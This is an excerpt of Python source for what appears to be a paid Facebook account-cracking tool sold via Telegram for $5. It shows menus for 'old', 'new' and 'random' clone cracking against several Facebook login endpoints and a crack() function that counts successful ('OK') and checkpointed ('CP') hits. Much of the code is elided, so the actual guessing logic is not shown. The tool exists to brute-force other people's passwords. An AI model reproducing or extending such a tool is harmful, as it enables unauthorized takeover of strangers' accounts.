...
------------------------------------------------------                """)
      ...
      print('                 ')
      print("\033[0;95m MSG ME FOR ACTIVE YOUR ID @@py_tanya")
      print('                 ')
      print("\033[0;95m PAID TOOL    @@py_tanya")
      print('                 ')
      print("\033[0;95m BO KREN NAMA BNERN BO  @@py_tanya")  
      print('                 ')
      print("\033[0;95m NRXE TOOL 5$ ")  
      print('                 ')
      os.system('xdg-open  https://t.me/@py_tanya')
...
════════════════════════════════════
║ 𝗢𝗪𝗡𝗘𝗥  ------>   @𝗽𝘆_𝘁𝗮𝗻𝘆𝗮              
║ 𝗖𝗿𝗲𝗮𝘁𝗼𝗿  :  𝗧𝗔𝗡𝗬𝗔𝗞𝗥𝗗.𝘁𝘅𝘁     
║ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : 𝗵𝘁𝘁𝗽𝘀://𝘁.𝗺𝗲/𝗸𝗿𝗱_𝗰𝗿𝗮𝗰𝗸𝗲𝗿𝘀    
║ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻  : 𝗡𝗘𝗪 𝗩𝟭                       
║ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : @𝗽𝘆_𝗧𝗔𝗡𝗬𝗔                   
╚════════════════════════════════════ ''')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu(my_name,my_id):
	...
	if _____alvino__adijaya_____ in ['1']:
		crack_file()
	elif _____alvino__adijaya_____ in ['20']:
		crack_file()
...
def setting():
	...
	print('        X-TANYA-X        ')
	print('')
	print('[ 1 ] CRACK OLD CLONE ')
	print('')
	print('')
	print('[ 2 ] CRACK NEW CLONE ')
	print('')
	print('')
	print('[ 3 ] CRACK RANDOM CLONE ')
	print('')
	print('        X-TANYA-X        ')
	print('')
	hu = input(' HALBZHERA = ')
	...
	print('        X-TANYA-X        ')
	print('')
	print('[ 1 ] Facebook/Mobile.com ')
	print('')
	print('')
	print('[ 2 ] Facebook/Touch.com ')
	print('')
	print('')
	print('[ 3 ] Facebook/Mbasic.com ')
	print('')
	print('')
	print('[ 3 ] Facebook/Free.com ')
	print('')
	print('        X-TANYA-X        ')
	print('')
	hc = input(' HALBZHERA = ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [ TANYA  {P}{H}{loop}\033[1;31m{P}  {P}{H} OK:{ok}{P}   {P}CP:{cp}{x}  ] "),
	sys.stdout.flush()
